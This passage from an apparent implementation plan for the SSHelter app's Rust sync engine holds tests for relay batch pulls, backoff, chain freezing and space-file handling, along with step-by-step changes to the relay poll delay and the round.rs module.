        let work = create_space(&a.env(), "Work").unwrap();
        settle(&a);
        let work_file = a.space_path(&work);
        // 取消勾選做到一半(狀態已是 `selected` = false、檔案還在),主 config 同時被另一個編輯器改過:新的 Include 清單
        // 寫不進去。
        a.runtime.core.lock().unwrap().state.as_mut().unwrap().spaces.get_mut(&work).unwrap().selected = false;
        let edited = format!("{}# edited elsewhere\n", a.main_config());
        a.write_externally(&a.main_path(), &edited);
        let (applied, wakes) = (a.events.applied.lock().unwrap().len(), a.events.wakes());
        sync_once(&a.env()).unwrap();
        assert_eq!(a.events.applied.lock().unwrap()[applied..], [0], "prepare_files reported the reload once; the round adds nothing");
        assert_eq!(a.events.wakes(), wakes + 1, "the next round runs right away");
        assert!(a.state().last_error.is_none(), "not an error for the status bar");
        assert!(work_file.exists(), "nothing is removed while the list on the disk still names it");
        assert_eq!(a.main_config(), edited);
        // 下一輪以重載後的 doc 做完:清單先換掉、檔案才刪,外部的編輯保留。
        settle(&a);
        assert!(!work_file.exists() && !a.state().spaces.contains_key(&work));
        assert!(a.main_config().contains("# edited elsewhere"));
        assert!(a.state().last_error.is_none());
    }

    #[test]
    fn a_rename_from_another_device_waits_for_a_main_config_edited_elsewhere() {
        let (_relay, _clock, a, b, _words, personal) = pair();
        let old = a.space_path(&personal);
        a.save_in_app(&old, "Host web\n");
        settle(&a);
        settle(&b);
        rename_space(&b.env(), &personal, "Home Lab").unwrap();
        settle(&b);
        let edited = format!("{}# edited elsewhere\n", a.main_config());
        a.write_externally(&a.main_path(), &edited);
        // 帳戶記錄已經存檔、改名寫不進 Include:doc 重載,`applied(0)` 只發一次、在鎖都放掉之後;不是錯誤,馬上重跑。
        let probe = AppliedProbe::new(&a);
        let mut env = a.env();
        env.events = &probe;
        sync_once(&env).unwrap();
        assert_eq!(*probe.all_free.lock().unwrap(), vec![true]);
        assert_eq!(probe.wakes(), 1);
        assert!(a.state().last_error.is_none());
        assert_eq!(a.read(&old), "Host web\n", "nothing was renamed while the list on the disk names the old file");
        assert_eq!(a.main_config(), edited);
        // 下一輪做完改名,外部的編輯保留。
        settle(&a);
        let renamed = a.space_path(&personal);
        assert!(renamed != old && !old.exists());
        assert_eq!(a.read(&renamed), "Host web\n");
        assert!(a.main_config().contains("# edited elsewhere"));
    }

    #[test]
    fn a_prepare_failure_after_the_state_changed_is_recorded_in_the_same_round() {
        let (_relay, _clock, a, _b, _words, _personal) = pair();
        let work = create_space(&a.env(), "Work").unwrap();
        settle(&a);
        // 取消勾選做到一半;狀態檔所在的 `data` 被一個一般檔案擋住:`prepare_files` 刪了檔、換了 generation,存檔才失敗。
        a.runtime.core.lock().unwrap().state.as_mut().unwrap().spaces.get_mut(&work).unwrap().selected = false;
        let data = a.home.path().join("data");
        std::fs::remove_dir_all(&data).unwrap();
        std::fs::write(&data, b"in the way").unwrap();
        let err = sync_once(&a.env()).unwrap_err();
        assert_eq!(a.state().last_error, Some(err.to_string()), "shown now, not one round later");
    }

    #[test]
    fn deferred_chains_go_first_in_the_next_batch_ahead_of_the_unsent_ones() {
        // 70 條 chain(> 64):第一批送 64 條、relay 只做前 10 條;下一批先放 deferred 的 54 條,再接還沒送的 6 條。
        let relay = FakeRelay::new();
        let token = "1".repeat(64);
        let targets: Vec<BatchPullItem> = (0..70)
            .map(|i| {
                let chain = format!("{i:02x}{}", "a".repeat(62));
                relay.create_chain(&chain, &token).unwrap();
                BatchPullItem { chain, token: token.clone(), since: 0 }
            })
            .collect();
        relay.set_budget(Some(10));
        relay.clear_calls();
        let pulled = pull_all(relay.as_ref(), &targets, true, 0).unwrap();
        assert!(!pulled.limited && !pulled.failed && pulled.batch_ok);
        assert_eq!(pulled.fetched.len(), 70);
        assert!(pulled.fetched.values().all(|f| matches!(f, Fetched::Ok(_))), "every chain was fetched in the end");
        let calls = relay.calls();
        let second: Vec<&str> = calls[1].trim_start_matches("batch:").split(',').collect();
        assert_eq!(second.len(), 60);
        assert_eq!(second[0], "0aaaaaaa", "the first deferred chain leads the next batch");
        assert_eq!(second[54], "40aaaaaa", "the chains never sent come after the deferred ones");
        // 整批 429:全部沒拿到,cursor 都不推進,也不改逐條查詢(被拒絕的批次照樣扣配額)。
        relay.fail_batches_with_429(1);
        relay.clear_calls();
        let pulled = pull_all(relay.as_ref(), &targets[..3], true, 0).unwrap();
        assert!(pulled.limited);
        assert!(pulled.fetched.values().all(|f| matches!(f, Fetched::Missed)));
        assert!(!relay.calls().iter().any(|c| c.starts_with("pull:")), "a rate-limited batch is never retried chain by chain");
    }

    #[test]
    fn one_broken_chain_fails_the_batch_and_the_second_failure_falls_back_to_single_pulls() {
        let relay = FakeRelay::new();
        let token = "1".repeat(64);
        let targets: Vec<BatchPullItem> = ["a", "b", "c"]
            .iter()
            .map(|c| {
                let chain = c.repeat(64);
                relay.create_chain(&chain, &token).unwrap();
                BatchPullItem { chain, token: token.clone(), since: 0 }
            })
            .collect();
        relay.set_broken(&targets[1].chain, true);
        // 第一次:整批 5xx,什麼都沒拿到,這一輪以退避收尾。
        let first = pull_all(relay.as_ref(), &targets, true, 0).unwrap();
        assert!(first.batch_failed && first.failed && !first.batch_ok);
        assert!(first.fetched.values().all(|f| matches!(f, Fetched::Missed)));
        // 連續第二次:這一輪改逐條查詢,壞掉的那一條不擋住其他的。
        relay.clear_calls();
        let second = pull_all(relay.as_ref(), &targets, true, 1).unwrap();
        assert!(second.batch_failed && second.failed);
        assert!(matches!(second.fetched[&targets[0].chain], Fetched::Ok(_)));
        assert!(matches!(second.fetched[&targets[1].chain], Fetched::Missed));
        assert!(matches!(second.fetched[&targets[2].chain], Fetched::Ok(_)));
        assert_eq!(relay.calls().iter().filter(|c| c.starts_with("pull:")).count(), 3);
    }

    #[test]
    fn deferred_chains_are_asked_again_first_and_wait_for_their_turn() {
        let (relay, _clock, a, b, _words, personal) = pair();
        let work = create_space(&a.env(), "Work").unwrap();
        settle(&a);
        settle(&b);
        select_space(&b.env(), &work).unwrap();
        settle(&b);
        a.save_in_app(&a.space_path(&personal), "Host web\n");
        a.save_in_app(&a.space_path(&work), "Host db\n");
        settle(&a);
        relay.set_budget(Some(1));
        relay.clear_calls();
        settle(&b);
        let batches: Vec<String> = relay.calls().into_iter().filter(|c| c.starts_with("batch:")).collect();
        let account = b.state().account.as_ref().unwrap().chain_id[..8].to_string();
        let (s1, s2) = if personal < work { (&personal[..8], &work[..8]) } else { (&work[..8], &personal[..8]) };
        assert_eq!(batches[..3], [format!("batch:{account},{s1},{s2}"), format!("batch:{s1},{s2}"), format!("batch:{s2}")]);
        assert_eq!(b.read(&b.space_path(&personal)), "Host web\n");
        assert_eq!(b.read(&b.space_path(&work)), "Host db\n");
    }

    #[test]
    fn an_old_relay_falls_back_to_single_pulls_and_spaces_every_third_round() {
        let (relay, _clock, a, b, _words, personal) = pair();
        relay.set_legacy(true);
        for d in [&a, &b] {
            d.runtime.core.lock().unwrap().relay_checked = None;
        }
        a.save_in_app(&a.space_path(&personal), "Host web\n");
        settle(&a);
        relay.clear_calls();
        let account = b.state().account.as_ref().unwrap().chain_id[..8].to_string();
        let mut seen = false;
        for _ in 0..3 {
            sync_once(&b.env()).unwrap();
            seen |= b.read(&b.space_path(&personal)) == "Host web\n";
        }
        let calls = relay.calls();
        assert!(!calls.iter().any(|c| c.starts_with("batch:")), "{calls:?}");
        assert_eq!(calls.iter().filter(|c| **c == format!("pull:{account}")).count(), 3, "the account every round");
        assert_eq!(calls.iter().filter(|c| **c == format!("pull:{}", &personal[..8])).count(), 1, "a space every third round");
        assert!(seen);
        assert!(!b.state().relay_features.unwrap().supports("pull-batch"));
    }

    #[test]
    fn the_poll_cadence_follows_focus_and_activity_and_backs_off_on_429() {
        let (relay, clock, _a, b, _words, _personal) = pair();
        // 剛同步過(有操作):一般間隔;視窗不在前景、幾分鐘沒有操作:約 5 分鐘。
        b.runtime.set_focused(true, clock.now_ms());
        assert_eq!(next_delay(&b.env()), Duration::from_secs(45));
        b.runtime.set_focused(false, clock.now_ms());
        clock.advance(10 * 60 * 1000);
        assert_eq!(next_delay(&b.env()), Duration::from_secs(300));
        // app 裡存檔 = 操作。
        b.save_in_app(&b.space_path(&_personal), "Host web\n");
        assert_eq!(next_delay(&b.env()), Duration::from_secs(45));
        b.runtime.set_focused(true, clock.now_ms());
        relay.fail_batches_with_429(2);
        sync_once(&b.env()).unwrap();
        assert_eq!(b.state().last_error.as_deref(), Some(RATE_LIMITED_MESSAGE));
        assert_eq!(next_delay(&b.env()), Duration::from_secs(90));
        sync_once(&b.env()).unwrap();
        assert_eq!(next_delay(&b.env()), Duration::from_secs(180));
        sync_once(&b.env()).unwrap();
        assert_eq!(next_delay(&b.env()), Duration::from_secs(45));
        assert!(b.state().last_error.is_none());
    }

    #[test]
    fn a_broken_space_chain_cannot_block_the_others() {
        let (relay, _clock, a, b, _words, personal) = pair();
        let work = create_space(&a.env(), "Work").unwrap();
        settle(&a);
        settle(&b);
        select_space(&b.env(), &work).unwrap();
        settle(&b);
        a.save_in_app(&a.space_path(&work), "Host db\n");
        settle(&a);
        relay.set_broken(&personal, true);
        // 第一輪:整批 5xx,什麼都沒套用、以退避收尾。
        sync_once(&b.env()).unwrap();
        assert_eq!(b.read(&b.space_path(&work)), "");
        assert_eq!(b.state().last_error.as_deref(), Some(RELAY_TROUBLE_MESSAGE));
        assert_eq!(b.runtime.core.lock().unwrap().batch_failures, 1);
        // 第二輪:改逐條查詢,Work 照常同步;壞掉的 Personal 只是這一輪沒拿到。
        sync_once(&b.env()).unwrap();
        assert_eq!(b.read(&b.space_path(&work)), "Host db\n");
        assert_eq!(b.runtime.core.lock().unwrap().failed_rounds, 2, "the delay keeps growing while the relay fails");
        relay.set_broken(&personal, false);
        settle(&b);
        let core = b.runtime.core.lock().unwrap();
        assert_eq!((core.batch_failures, core.failed_rounds), (0, 0));
    }

    /// 模擬另一台(id `dev-z`)更換了同步碼:舊帳戶寫入標記並凍結舊帳戶與 space chain。
    pub(crate) fn rotate_elsewhere(d: &TestDevice, relay: &FakeRelay) {
        let (keys, spaces) = {
            let core = d.runtime.core.lock().unwrap();
            let s = core.state.as_ref().unwrap();
            let keys = core.account_keys.clone().unwrap();
            let spaces: Vec<ChainKeys> = s.spaces.keys().filter_map(|id| space_keys(s.account.as_ref().unwrap(), &keys, id)).collect();
            (keys, spaces)
        };
        let mut marker_account = AccountState::new(&keys.chain_id);
        let marker = RotationMarkerPayload { rotated_at_ms: 1, by_device_id: "dev-z".into(), by_device_name: "MacBook-Z".into() };
        put_account_record(&mut marker_account, RecordKind::Meta, &rotation_meta_id("dev-z"), serde_json::to_value(marker).unwrap(), false, "dev-z", 1);
        let outgoing = account_outgoing(&marker_account, &keys).unwrap();
        assert!(push_outgoing(relay, &keys.chain_id, &keys.auth_token, &outgoing).error.is_none());
        relay.freeze_chain(&keys.chain_id, &keys.auth_token).unwrap();
        for space in spaces {
            relay.freeze_chain(&space.chain_id, &space.auth_token).unwrap();
        }
    }

    #[test]
    fn a_rotation_marker_freezes_this_device_before_anything_else_happens() {
        let (relay, _clock, a, b, _words, personal) = pair();
        a.save_in_app(&a.space_path(&personal), "Host web\n");
        settle(&a);
        rotate_elsewhere(&a, &relay);
        b.save_in_app(&b.space_path(&personal), "Host local\n");
        relay.clear_calls();
        settle(&b);
        let s = b.state();
        assert!(relay.is_frozen(&s.account.as_ref().unwrap().chain_id));
        let frozen = s.frozen().unwrap();
        assert_eq!(frozen.markers[0].by_device_name, "MacBook-Z");
        assert_eq!(b.read(&b.space_path(&personal)), "Host local\n", "no space result was applied");
        assert!(s.spaces[&personal].records["host:local"].dirty, "the local edit is kept for the new account");
        assert!(!relay.calls().iter().any(|c| c.starts_with("push:")), "nothing is uploaded");
        // 之後的輪次不做任何網路寫入。
        relay.clear_calls();
        settle(&b);
        assert!(relay.calls().iter().all(|c| !c.starts_with("push:") && !c.starts_with("create:") && !c.starts_with("freeze:")));
    }

    #[test]
    fn a_frozen_push_stops_uploads_and_the_next_round_reads_the_markers() {
        let (relay, _clock, a, b, _words, personal) = pair();
        // B 已經拉過帳戶、還沒看到標記時,另一台凍結了所有 chain:B 的推送被擋下。
        rotate_elsewhere(&a, &relay);
        {
            // B 的帳戶 cursor 已在標記之後:這一輪的拉取看不到標記,只會在推送時撞到凍結。
            let keys = b.runtime.core.lock().unwrap().account_keys.clone().unwrap();
            let latest = relay.pull(&keys.chain_id, &keys.auth_token, 0).unwrap().latest_seq;
            b.runtime.core.lock().unwrap().state.as_mut().unwrap().account.as_mut().unwrap().cursor_seq = latest;
        }
        b.save_in_app(&b.space_path(&personal), "Host local\n");
        // 這台自己在更換同步碼時(`mark_frozen_chains` = false):只回報,不記進狀態。
        let (generation, s, keys) = {
            let core = b.runtime.core.lock().unwrap();
            (core.generation, core.state.clone().unwrap(), core.account_keys.clone().unwrap())
        };
        assert!(run_round(&b.env(), generation, s, keys, false).unwrap().frozen);
        assert!(b.state().frozen().is_none());
        sync_once(&b.env()).unwrap();
        let s = b.state();
        assert!(s.frozen().unwrap().markers.is_empty(), "a 409 alone has no marker yet");
        assert!(s.spaces[&personal].records["host:local"].dirty);
        sync_once(&b.env()).unwrap();
        assert_eq!(b.state().frozen().unwrap().markers[0].by_device_name, "MacBook-Z");
    }

    #[test]
    fn a_missing_account_and_a_missing_space_are_reported() {
        let (relay, _clock, a, b, _words, personal) = pair();
        let space = {
            let core = a.runtime.core.lock().unwrap();
            space_keys(core.state.as_ref().unwrap().account.as_ref().unwrap(), core.account_keys.as_ref().unwrap(), &personal).unwrap()
        };
        relay.delete_chain(&space.chain_id, &space.auth_token).unwrap();
        settle(&b);
        let s = b.state();
        assert!(s.spaces[&personal].missing);
        assert_eq!(s.spaces[&personal].last_error.as_deref(), Some(SPACE_GONE_MESSAGE));
        // 重建:以同一組位置與權杖重新建立,上傳這台的內容。
        b.save_in_app(&b.space_path(&personal), "Host web\n");
        crate::sync::spaces::rebuild_space(&b.env(), &personal).unwrap();
        settle(&b);
        assert!(!relay.rows(&personal).is_empty());
        let keys = a.runtime.core.lock().unwrap().account_keys.clone().unwrap();
        relay.delete_chain(&keys.chain_id, &keys.auth_token).unwrap();
        assert_eq!(sync_once(&a.env()).unwrap_err().to_string(), ACCOUNT_GONE_MESSAGE);
        assert_eq!(a.state().last_error.as_deref(), Some(ACCOUNT_GONE_MESSAGE));
    }

    #[test]
    fn an_emptied_space_file_is_restored_from_the_chain_instead_of_deleting_every_host() {
        let (_relay, _clock, a, b, _words, personal) = pair();
        a.save_in_app(&a.space_path(&personal), "Host web\nHost db\n");
        settle(&a);
        settle(&b);
        b.write_externally(&b.space_path(&personal), "");
        settle(&b);
        let text = b.read(&b.space_path(&personal));
        assert!(text.contains("Host web") && text.contains("Host db"), "{text}");
        settle(&a);
        assert_eq!(a.read(&a.space_path(&personal)), "Host web\nHost db\n", "no tombstone reached the other device");
    }

    #[test]
    fn a_push_that_stops_part_way_keeps_what_the_relay_accepted() {
        let (relay, _clock, a, _b, _words, personal) = pair();
        // 250 台主機 = 兩批(每批 ≤ 200);第一批寫進去之後 chain 的儲存額度就滿了(413)。
        let text: String = (0..250).map(|i| format!("Host h{i}\n  HostName 10.0.{}.{}\n", i / 200, i % 200)).collect();
        a.save_in_app(&a.space_path(&personal), &text);
        relay.set_push_quota(Some(1));
        let err = sync_once(&a.env()).unwrap_err();
        assert!(err.to_string().contains("storage quota"), "{err}");
        assert_eq!(a.state().last_error, Some(err.to_string()));
        let dirty = a.state().spaces[&personal].records.values().filter(|l| l.dirty).count();
        assert_eq!(dirty, 50, "the 200 records the relay accepted are clean; only the second batch waits");
        // 額度恢復之後,剩下的照常上傳。
        relay.set_push_quota(None);
        settle(&a);
        assert!(a.state().spaces[&personal].records.values().all(|l| !l.dirty));
    }

    #[test]
    fn a_relay_restored_from_an_older_backup_gets_this_devices_records_again() {
        let (relay, _clock, a, b, _words, personal) = pair();
        a.save_in_app(&a.space_path(&personal), "Host web\n");
        settle(&a);
        let backup = relay.rows(&personal).last().map(|e| e.seq).unwrap_or(0);
        a.save_in_app(&a.space_path(&personal), "Host web\nHost db\n");
        settle(&a);
        settle(&b);
        sync_once(&a.env()).unwrap(); // A 的 cursor 走到 db 之後
        // 自架 relay 從舊備份還原:db 不見了,watermark 倒退到 A 的 cursor 之下。
        relay.roll_back(&personal, backup);
        settle(&a);
        assert!(relay.rows(&personal).len() >= 2, "A uploaded what the relay lost");
        let c = TestDevice::new("c", &relay, &a.clock);
        join_account(&c.env(), &_words, "MacBook-C").unwrap();
        select_space(&c.env(), &personal).unwrap();
        settle(&c);
        let text = c.read(&c.space_path(&personal));
        assert!(text.contains("Host web\n") && text.contains("Host db\n"), "{text}");
        assert!(c.events.statuses() > 0, "every round ends with a status event");
    }

    #[test]
    fn a_vanished_space_file_comes_back_from_the_chain_with_unpushed_edits() {
        let (relay, _clock, a, b, _words, personal) = pair();
        a.save_in_app(&a.space_path(&personal), "Host web\nHost db\n");
        settle(&a);
        settle(&b);
        relay.set_offline(true);
        b.save_in_app(&b.space_path(&personal), "Host web\n  User offline\nHost db\n");
        let _ = sync_once(&b.env());
        relay.set_offline(false);
        std::fs::remove_file(b.space_path(&personal)).unwrap();
        settle(&b);
        let text = b.read(&b.space_path(&personal));
        assert!(text.contains("Host db\n") && text.contains("User offline"), "{text}");
        settle(&a);
        assert!(a.read(&a.space_path(&personal)).contains("User offline"), "the offline edit was not tombstoned");
    }
}
```

- [ ] **Step 6: 更新 `src-tauri/src/sync/mod.rs`**

把 `src-tauri/src/sync/mod.rs` 整個換成:

```rust
//! Sync chain: Brave 式免帳號端對端同步。各子模組單一責任、皆可單元測試:
//! - `crypto`: 助記詞、金鑰派生、記錄加密
//! - `record`: 記錄模型與 LWW 合併(Task 2)
//! - `hosts_file`: 受管同步檔的區塊操作(Task 3)
//! - `planner`: 本機變更偵測(Task 1)
//! - `state`: 本機同步狀態持久化(Task 4)
//! - `relay`: 中繼 HTTP client(Task 5)
//! - `reconcile`: 一輪同步的三段純函式(plan_local → pull_merge → push_dirty)
//! - `engine`: 背景同步執行緒、`SyncCore`、存檔當下規劃、套用+發布交易、Tauri commands
//! - `space_files`: Sync v2 的 space 檔命名、Include 清單順序與建立 / 移除 / 改名的順序規則
//! - `approval`: Sync v2 危險設定的核准簽章
//! - `state_v2`: Sync v2 的本機狀態(`version: 2`)與 v1 狀態檔的偵測
//! - `merge`: Sync v2 帳戶與 space 區段的本機 diff、合併、上傳(純函式)
//! - `fake_relay`(只在測試):記憶體假 relay
//! - `dto`: Sync v2 給前端的事件與狀態形狀
//! - `runtime`: Sync v2 的 `SyncCore` 與局部提交
//! - `env`: Sync v2 引擎與外界的邊界(keychain、relay、事件、時鐘)
//! - `files`: Sync v2 space 檔的準備、讀取、套用 + 發布交易、存檔 hook
//! - `testkit`(只在測試):測試裝置
//! - `account`: Sync v2 帳戶生命週期與 relay 設定
//! - `spaces`: Sync v2 space 操作與核准
//! - `round`: Sync v2 的一輪同步

pub mod account;
pub mod approval;
pub mod crypto;
pub mod dto;
pub mod engine;
pub mod env;
#[cfg(test)]
pub mod fake_relay;
pub mod files;
pub mod hosts_file;
pub mod merge;
pub mod migrate;
pub mod planner;
pub mod reconcile;
pub mod record;
pub mod relay;
pub mod round;
pub mod runtime;
pub mod space_files;
pub mod spaces;
pub mod state;
pub mod state_v2;
#[cfg(test)]
pub mod testkit;
```

- [ ] **Step 7: 跑測試確認失敗**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: FAIL —— 編譯錯誤(測試用到的實作還不存在),例如:

```text
error[E0425]: cannot find function `sync_once` in this scope
--> src/sync/round.rs:49:21
```

- [ ] **Step 8: 修改 `src-tauri/src/sync/relay.rs`**

B1 裁定 1:正在用(前景或 5 分鐘內有操作)才用一般間隔,否則約 5 分鐘;退避不短於當下的間隔。

`src-tauri/src/sync/relay.rs`:把

```rust
}

/// 下一輪之前等多久(spec §6.4):`rate_limited_rounds` = 連續以 `429`(整批或 `rate_limited`)收尾的輪數;0 → 一般
/// 間隔;之後依序 90 秒、3 分、6 分……最長 15 分鐘,但不短於一般間隔。成功一輪後呼叫端把計數歸零。
pub fn next_poll_delay(chains: usize, rate_limited_rounds: u32) -> Duration {
    let normal = poll_interval(chains);
    if rate_limited_rounds == 0 {
        return normal;
    }
    let backoff = Duration::from_secs(FIRST_BACKOFF_SECS << (rate_limited_rounds.min(10) - 1)).min(MAX_BACKOFF);
    normal.max(backoff)
}
```

換成:

```rust
}

/// 閒置時的輪詢間隔:relay 的配額有限(Cloudflare Workers Free 每天 100,000 次 Durable Object 請求;每次輪詢 = 1 次
/// 限流計數 + 批次裡每條 chain 1 次),視窗不在前景、最近也沒有操作的電腦約每 5 分鐘查一次就好。
pub const IDLE_POLL_INTERVAL: Duration = Duration::from_secs(5 * 60);
/// 這段時間內有操作(app 存檔、Sync 命令、視窗回到前景)就算「正在用」。
pub const ACTIVE_WINDOW: Duration = Duration::from_secs(5 * 60);

/// 下一輪之前等多久(spec §6.4 + relay 配額):
/// - 正在用(`focused`,或 `ACTIVE_WINDOW` 內有操作 —— `last_activity_ms` 比 `now_ms` 晚也算):一般間隔
///   max(45 秒, 2 秒 × chain 數);
/// - 閒置:max(5 分, 2 秒 × chain 數);
/// - `consecutive_failures` = 連續以 `429`(整批或 `rate_limited`)或 relay `5xx` 收尾的輪數:90 秒起每輪加倍,最長
///   15 分鐘,但不短於上面的間隔。成功一輪後呼叫端把計數歸零。被限流時絕不立刻重試。
pub fn next_poll_delay(chains: usize, focused: bool, last_activity_ms: u64, now_ms: u64, consecutive_failures: u32) -> Duration {
    let active = focused || now_ms.saturating_sub(last_activity_ms) < ACTIVE_WINDOW.as_millis() as u64;
    let normal = if active { poll_interval(chains) } else { IDLE_POLL_INTERVAL.max(poll_interval(chains)) };
    if consecutive_failures == 0 {
        return normal;
    }
    let backoff = Duration::from_secs(FIRST_BACKOFF_SECS << (consecutive_failures.min(10) - 1)).min(MAX_BACKOFF);
    normal.max(backoff)
}
```

- [ ] **Step 9: 修改 `src-tauri/src/sync/files.rs`**

Task 2 審查的 M3 註解:這個 task 起同步輪次自己用 `commit` 寫 space 區段,不變式改成「其他執行緒上的寫入者都換 generation」。

`src-tauri/src/sync/files.rs`:把

```rust
/// 照常發布,否則本 space 作廢。通知在鎖放掉之後(`events.applied(0)`:doc 重載過)。
///
/// 整個區段換成 `next`(只保留 `rename_blocked`)之所以安全,靠這個不變式:**除了 `rename_blocked`,其他任何會寫 space
/// 區段的路徑都換 generation**(`mutate`、`prepare_files`、`note_written`,或在 doc 鎖內自己換)。`rename_blocked` 由帳戶
/// 那一步用 `commit` 寫(不換 generation),所以這裡保留最新的;其他欄位在本輪開始之後有人動過,generation 就變了,這裡會
/// 先被 `superseded()` 擋下、不會發布。往後新增的寫入者若不換 generation,就必須像 `rename_blocked` 一樣在這裡保留。
pub fn apply_and_commit_space(
    env: &SyncEnv,
```

換成:

```rust
/// 照常發布,否則本 space 作廢。通知在鎖放掉之後(`events.applied(0)`:doc 重載過)。
///
/// 整個區段換成 `next`(只保留 `rename_blocked`)之所以安全,靠這個不變式:**其他執行緒上任何會寫 space 區段的路徑都換
/// generation**(`mutate`、`prepare_files`、`note_written`,或在 doc 鎖內自己換)。同步輪次自己用 `commit` 寫的(本機
/// diff 與暫停、`space_error`、`missing`、上傳結果)都在同一個執行緒上、與這裡依序發生:`next` 由那些寫入之後的工作副本
/// 算出,上傳結果在這裡發布之後才寫。`rename_blocked` 由帳戶那一步寫(不換 generation),所以這裡保留最新的;其他欄位在本輪
/// 開始之後被別的執行緒動過,generation 就變了,這裡會先被 `superseded()` 擋下、不會發布。往後新增的寫入者若在別的執行緒
/// 又不換 generation,就必須像 `rename_blocked` 一樣在這裡保留。
pub fn apply_and_commit_space(
    env: &SyncEnv,
```

- [ ] **Step 10: 實作 `src-tauri/src/sync/round.rs`**

重點:`pull_all` 的 deferred 排序、整批 `429` 不重試、批次 `5xx` 第二次起逐條;帳戶結果一律先處理,有標記就停;每個 space 經 `apply_and_commit_space` 各自提交;推送 `frozen` 立刻 `frozen_out`;`chain_deletes` 在帳戶上傳成功之後才執行。

推送依 Task 1 實際的介面:`push_outgoing` 回 `Pushed`,先套用 `accepted`(帳戶也更新 `work.account`,`chain_deletes` 才看得到 tombstone 已上傳),再看 `frozen`,最後把 `error` 當成以前的錯誤分支。

`prepare_files` 回 `Conflict`:不再發 `applied(0)`、`wake()` 後結束這一輪;其他錯誤在 generation 已經變了時由這裡寫進 `last_error`(`note_error`)。`commit_account`:`reconcile_space_files` 失敗時放掉鎖再發 `applied(0)`;`Conflict` 由 `run_round` 當成馬上重跑。

`src-tauri/src/sync/round.rs`:在 `use` 區之後、`#[cfg(test)]` 之前加入:

```rust
pub const ACCOUNT_GONE_MESSAGE: &str =
    "This sync account no longer exists on the relay (deleted from another device or expired) — leave it on this device";
pub const SPACE_GONE_MESSAGE: &str =
    "this space's data is missing on the relay — rebuild it from this device, or delete the space";
pub const MISSING_KEY_MESSAGE: &str = "the key for this space has not arrived from the sync account yet";
pub const RATE_LIMITED_MESSAGE: &str = "the relay is limiting requests from this network; sync retries automatically in a few minutes";
pub const RELAY_TROUBLE_MESSAGE: &str = "the relay had trouble answering; sync retries with a growing delay";
const STUCK_CONFLICTS_MESSAGE: &str =
    "Some changes could not be uploaded because the relay holds a newer version this SSHelter cannot read — update SSHelter";
/// 連續這麼多輪以推送衝突收尾之後,不再立刻重跑(同 v1)。
const CONFLICT_RETRY_LIMIT: u32 = 3;
/// 舊版 relay(沒有批次查詢)時,space 每幾輪查一次;帳戶 chain 每輪都查(spec §6.4)。
const LEGACY_SPACE_EVERY: u64 = 3;

/// 一條 chain 這一輪拉到的結果。
#[derive(Debug)]
enum Fetched {
    Ok(PullResponse),
    NotFound,
    /// 被限流,或批次因 `deferred` / 整批 `429` 沒輪到:cursor 不推進。
    Missed,
}

/// `run_round` 的結果。
#[derive(Debug, Default, PartialEq)]
pub struct RoundOutcome {
    /// relay 回報某條 chain 已凍結(push `409 frozen`)。`mark_frozen` 時已記進狀態。
    pub frozen: bool,
}

/// `pull_all` 的結果。
#[derive(Debug, Default)]
struct Pulled {
    fetched: BTreeMap<String, Fetched>,
    /// 有 chain(或整批)被限流:這一輪以退避收尾。
    limited: bool,
    /// relay 回 `5xx`(整批或單條):這一輪以退避收尾。
    failed: bool,
    /// 這一輪的批次查詢回了 `5xx`(連續第幾次由呼叫端記在 `SyncCore::batch_failures`)。
    batch_failed: bool,
    /// 這一輪至少有一次批次查詢成功(呼叫端把 `batch_failures` 歸零)。
    batch_ok: bool,
}

/// 批次查詢(spec §6.4):每批 ≤ 64 條;有 `deferred` 時**只**把 deferred 的項目排在最前面立刻再發一批;沒取得的 chain
/// 不推進 cursor。舊版 relay(`Unsupported`)或已知沒有批次功能時逐條 `GET`。
/// relay 的一條 chain 出錯會讓整批回 `5xx`:`batch_failures`(之前連續失敗的次數)加上這一次達到 2,就在這一輪改逐條
/// `GET`,一條壞掉的 chain 不能擋住其他的(它自己記為沒取得、這一輪以退避收尾)。整批 `429` 一律不重試、也不改逐條
/// —— 被拒絕的批次照樣扣了整批的配額,只能退避。
fn pull_all(relay: &dyn RelayApi, targets: &[BatchPullItem], mut batch: bool, batch_failures: u32) -> Result<Pulled, RelayError> {
    let mut out = Pulled::default();
    let mut queue: Vec<BatchPullItem> = targets.to_vec();
    while batch && !queue.is_empty() {
        let take = queue.len().min(MAX_BATCH_PULL);
        let chunk: Vec<BatchPullItem> = queue[..take].to_vec();
        match relay.pull_batch(&chunk) {
            Ok(entries) => {
                out.batch_ok = true;
                let mut deferred = Vec::new();
                for (item, entry) in chunk.into_iter().zip(entries) {
                    match entry.result {
                        BatchPullResult::Ok(resp) => {
                            out.fetched.insert(item.chain.clone(), Fetched::Ok(resp));
                        }
                        BatchPullResult::NotFound => {
                            out.fetched.insert(item.chain.clone(), Fetched::NotFound);
                        }
                        BatchPullResult::RateLimited => {
                            out.limited = true;
                            out.fetched.insert(item.chain.clone(), Fetched::Missed);
                        }
                        BatchPullResult::Deferred => deferred.push(item),
                    }
                }
                if deferred.len() == take {
                    // relay 一項都沒執行(第一項應該一律執行):不再重試,這些 chain 本輪不推進。
                    for item in deferred {
                        out.fetched.insert(item.chain.clone(), Fetched::Missed);
                    }
                    deferred = Vec::new();
                }
                let rest = queue.split_off(take);
                queue = deferred;
                queue.extend(rest);
            }
            Err(RelayError::RateLimited) => {
                out.limited = true;
                for item in queue.drain(..) {
                    out.fetched.insert(item.chain.clone(), Fetched::Missed);
                }
            }
            Err(RelayError::Unsupported(_)) => batch = false,
            Err(RelayError::Http(code)) if code >= 500 => {
                out.failed = true;
                out.batch_failed = true;
                if batch_failures + 1 >= 2 {
                    batch = false; // 連續第二次:這一輪改逐條查詢
                } else {
                    for item in queue.drain(..) {
                        out.fetched.insert(item.chain.clone(), Fetched::Missed);
                    }
                }
            }
            Err(e) => return Err(e),
        }
    }
    for item in queue {
        let fetched = match relay.pull(&item.chain, &item.token, item.since) {
            Ok(resp) => Fetched::Ok(resp),
            Err(RelayError::NotFound) => Fetched::NotFound,
            Err(RelayError::RateLimited) => {
                out.limited = true;
                Fetched::Missed
            }
            Err(RelayError::Http(code)) if code >= 500 => {
                out.failed = true;
                Fetched::Missed
            }
            Err(RelayError::BadResponse(_)) => {
                out.failed = true;
                Fetched::Missed
            }
            Err(e) => return Err(e),
        };
        out.fetched.insert(item.chain, fetched);
    }
    Ok(out)
}

